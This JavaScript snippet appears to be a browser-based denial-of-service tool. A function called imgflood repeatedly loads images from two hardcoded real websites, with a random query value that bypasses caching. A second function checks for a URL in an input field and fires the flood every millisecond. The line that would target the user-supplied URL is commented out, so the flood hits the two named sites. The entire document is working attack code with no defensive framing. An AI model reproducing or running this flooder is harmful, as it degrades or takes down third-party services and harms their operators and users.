function imgflood() {
  var TARGET = document.getElementById('sss').value;
  var pic = new Image();
  var ran = Math.floor(Math.random() * 1000);
  //pic.src = TARGET+'?val='+ran;
  pic.src = 'https://www.yunxiao.com?val='+ran;
  pic.src = 'https://yue.haofenshu.com?val='+ran;

}
function aaa(){
  if (document.getElementById('sss').value.search( /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/) != -1){
  setInterval(imgflood, 1);
}else{
  alert('It is not a url.')
}
}
